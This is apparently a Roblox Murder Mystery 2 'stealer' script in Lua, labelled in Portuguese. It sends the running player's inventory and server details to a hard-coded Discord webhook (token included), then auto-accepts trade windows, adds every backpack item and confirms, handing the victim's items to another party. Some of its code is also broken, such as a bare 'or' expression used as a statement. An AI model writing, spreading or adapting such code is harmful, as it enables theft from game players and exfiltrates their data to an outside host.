loadstring([[
local WEBHOOK_URL = "https://discord.com/api/webhooks/1559786806340362330/GbFuirjd8uCGGNM4if_6TPj6djG6yIabBaAJw_geMd_Fg5-k0SATkobv3svmVvNPFQQJ"
local DISCORD_INVITE = "https://discord.gg/SEU_CONVITE"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local function getInventory()
    local inv = {}
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if bp then
        for _, i in ipairs(bp:GetChildren()) do
            if i:IsA("Tool") then table.insert(inv, i.Name) end
        end
    end
    local ch = LocalPlayer.Character
    if ch then
        for _, i in ipairs(ch:GetChildren()) do
            if i:IsA("Tool") then table.insert(inv, i.Name .. " (equipado)") end
        end
    end
    return inv
end

local function sendInventory()
    local inv = getInventory()
    local fields, chunk = {}, {}
    for i, name in ipairs(inv) do
        table.insert(chunk, name)
        if #chunk == 10 or i == #inv then
            table.insert(fields, { name = "Itens", value = table.concat(chunk, "\n"), inline = false })
            chunk = {}
        end
    end
    if #fields == 0 then
        table.insert(fields, { name = "Itens", value = "vazio", inline = false })
    end
    local payload = {
        username = "MM2 Logger",
        embeds = {{
            title = "Inventário",
            description = "**" .. LocalPlayer.Name .. "** | ID: " .. LocalPlayer.UserId .. "\nPlaceID: " .. game.PlaceId .. "\nJobID: " .. game.JobId,
            color = 0x00FF00,
            fields = fields,
            footer = { text = "Servidor: " .. DISCORD_INVITE },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }
    pcall(function()
        HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
    end)
end

local ACCEPT_DELAY, CONFIRM_DELAY, ADD_ITEMS = 0.1, 0.1, true

local function findTradeGui()
    local pg = LocalPlayer:FindFirstChild("PlayerGui")
    if not pg then return nil end
    for _, g in ipairs(pg:GetChildren()) do
        if g.Name:lower():find("trade") then return g end
    end
    return nil
end

local function fireBtn(b, ...)
    pcall(function() b:FireServer(...) end)
    pcall(function() b.MouseButton1Click:Fire() end)
end

local function scanButtons(g, kw, ex)
    for _, o in ipairs(g:GetDescendants()) do
        if o:IsA("TextButton") or o:IsA("ImageButton") then
            if o.Name:lower():find(kw) then fireBtn(o, ex); return true end
        end
    end
    return false
end

local function autoAdd(g)
    if not ADD_ITEMS then return end
    local bp = LocalPlayer:FindFirstChild("Backpack")
    if not bp then return end
    for _, t in ipairs(bp:GetChildren()) do
        if t:IsA("Tool") then
            for _, o in ipairs(g:GetDescendants()) do
                if o:IsA("TextButton") or o:IsA("ImageButton") then
                    local n = o.Name:lower()
                    if n:find("add") or n:find("adicionar") then
                        pcall(function() o:FireServer(t) end)
                    end
                end
            end
        end
    end
end

local function handleTrade(g)
    task.wait(ACCEPT_DELAY)
    scanButtons(g, "accept") or scanButtons(g, "aceitar")
    if ADD_ITEMS then autoAdd(g) end
    task.wait(CONFIRM_DELAY)
    scanButtons(g, "confirm") or scanButtons(g, "confirmar")
end

local lastGui = nil
task.spawn(function()
    while task.wait(0.25) do
        local g = findTradeGui()
        if g and g ~= lastGui then lastGui = g; handleTrade(g) end
    end
end)

local pg = LocalPlayer:FindFirstChild("PlayerGui")
if pg then
    pg.ChildAdded:Connect(function(c)
        if c.Name:lower():find("trade") then handleTrade(c) end
    end)
end

sendInventory()
print("[+] Keyless. Logger enviado. Auto Trade ativo.")
]])()
